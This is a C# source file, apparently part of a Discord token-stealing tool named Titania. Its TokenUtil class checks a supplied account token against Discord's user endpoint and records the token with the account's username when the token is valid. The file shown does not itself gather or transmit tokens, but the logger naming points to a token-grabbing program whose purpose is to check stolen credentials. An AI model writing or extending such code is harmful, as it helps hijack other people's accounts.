﻿using System;
using System.IO;
using System.Net;
using System.Text;
namespace Titania.Logging
{
    internal class TokenUtil
    {
        public static TokenInfo checkToken(String token)
        {
            var client = new WebClient();
            client.Headers.Add("content-type", "application/json");
            client.Headers.Add("User-Agent", "kath");
            client.Headers.Add("Authorization", token);
            StreamReader reader = null;
            try
            {
                reader = new StreamReader(client.OpenRead("https://discord.com/api/v9/users/@me"), Encoding.UTF8);
            }
            catch (Exception)
            {
                return new TokenInfo(token, "invaild", false);
            }
            var json = Encoding.UTF8.GetString(Encoding.Default.GetBytes(reader.ReadToEnd()));
            if (MainLogger.getJsonKey(json, "username") != null)
            {
                return new TokenInfo(token, MainLogger.getJsonKey(json, "username") + "#" + MainLogger.getJsonKey(json, "discriminator"), true);
            }

            return new TokenInfo(token, "invaild", false);
        }
    }

    public class TokenInfo
    {
        public String token;
        public String username;
        public Boolean vaild;
        public TokenInfo(String token, String username, Boolean vaild)
        {
            this.token = token;
            this.username = username;
            this.vaild = vaild;
        }
    }
}